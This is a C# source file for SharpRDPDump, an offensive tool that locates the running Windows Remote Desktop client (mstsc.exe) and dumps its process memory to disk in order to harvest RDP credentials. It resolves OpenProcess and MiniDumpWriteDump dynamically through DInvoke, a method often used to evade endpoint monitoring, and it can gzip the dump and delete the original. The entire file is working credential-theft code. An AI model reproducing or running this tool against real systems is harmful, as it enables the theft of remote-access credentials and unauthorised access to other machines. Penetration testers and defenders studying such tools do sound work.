using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Security.Principal;
using DInvoke.DynamicInvoke;
using NDesk.Options;

/*
 * inspiration @jonasLyk and https://pentestlab.blog/2021/05/24/dumping-rdp-credentials/amp/?__twitter_impression=true
 */
namespace SharpRDPDump
{
    class Program
    {
        public static void PrintBanner()
        {
            Console.WriteLine(@"

 ._________________.
 | _______________ |
 | I             I |
 | I    RDPDump  I |
 | I    @jfmaes  I |
 | I             I |
 | I_____________I |
 !_________________!
    ._[_______]_.
.___|___________|___.
|::: ____           |
|    ~~~~ [CD-ROM]  |
!___________________!   


   ");
        }

        public static void ShowHelp(OptionSet p)
        {
            Console.WriteLine(" Usage:");
            p.WriteOptionDescriptions(Console.Out);
        }
        public static bool Is64Bits()
        {
            return Marshal.SizeOf(typeof(IntPtr)) == 8 ? true : false;
        }

        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void Compress(string inFile, string outFile)
        {
            try
            {
                if (File.Exists(outFile))
                {
                    Console.WriteLine("[X] Output file '{0}' already exists, removing", outFile);
                    File.Delete(outFile);
                }

                var bytes = File.ReadAllBytes(inFile);
                using (FileStream fs = new FileStream(outFile, FileMode.CreateNew))
                {
                    using (GZipStream zipStream = new GZipStream(fs, CompressionMode.Compress, false))
                    {
                        zipStream.Write(bytes, 0, bytes.Length);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception while compressing file: {0}", ex.Message);
            }
        }

        public static void Minidump(string dumpFile, bool compress)
        {
            if (string.IsNullOrEmpty(dumpFile))
            {
                throw new Exception("you need to specify a location to write the dump to.");
            }

            uint targetProcessId = (uint)Process.GetProcessesByName("mstsc")[0].Id;
            if (targetProcessId == 0)
            {
                throw new Exception("mstsc.exe does not seem to be running.");
            }
            Console.WriteLine("mstsc found! dumping PID:" + targetProcessId);
            object[] openProcParams = { DInvoke.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_QUERY_INFORMATION | DInvoke.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_VM_READ, false, targetProcessId };
            IntPtr targetProcessHandle = (IntPtr)Generic.DynamicAPIInvoke("kernel32.dll", "OpenProcess", typeof(Win32.Delegates.OpenProcess), ref openProcParams);
            bool bRet = false;

            using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
            {
                IntPtr minidumpPtr = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("Dbgcore.dll", "MiniDumpWriteDump", true);
                Object[] minidumpArgs = { targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero };
                bRet = (bool)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(minidumpPtr, typeof(Delegates.MiniDumpWriteDump), ref minidumpArgs);

            }

            // if successful
            if (bRet)
            {
                Console.WriteLine("[+] Dump successful!");
                if (compress)
                {
                    string zipFile = dumpFile + ".gz";
                    Console.WriteLine(String.Format("\n[*] Compressing {0} to {1} gzip file", dumpFile, zipFile));
                    Compress(dumpFile, zipFile);
                    Console.WriteLine(String.Format("[*] Deleting {0}", dumpFile));
                    File.Delete(dumpFile);
                    dumpFile = zipFile;
                }
                Console.WriteLine("\n[+] Dumping completed." + "\n check " + dumpFile);

            }
            else
            {
                Console.WriteLine(String.Format("[X] Dump failed: {0}", bRet));
            }
        }
        static void Main(string[] args)
        {
            bool compress = false;
            bool help = false;
            string dumpLocation = Environment.GetEnvironmentVariable("LocalAppData") + @"\rdpdump.bin";

            var options = new OptionSet()
            {
                {"h|?|help", "Show Help\n\n", o => help = true},
                {"l|location=",@"the location to write the minidumpfile to (default:%localappdata%\rdpdump.bin)", o=>dumpLocation = o },
                {"c|compress","compressess the minidump and deletes the normal dump from disk (gzip format)",o => compress = true }
            };

            //   try
            {
                PrintBanner();
                if (!Is64Bits())
                {
                    throw new Exception("only 64 bit is supported. (for now)");

                }

                if (!IsHighIntegrity())
                {
                    throw new Exception("you need admin privs to dump RDP");
                }

                options.Parse(args);

                if (help)
                {
                    ShowHelp(options);
                    return;
                }
                Minidump(dumpLocation, compress);
            }
            // catch (Exception ex)
            {
                //   Console.WriteLine(ex.Message);
            }
        }
    }
}
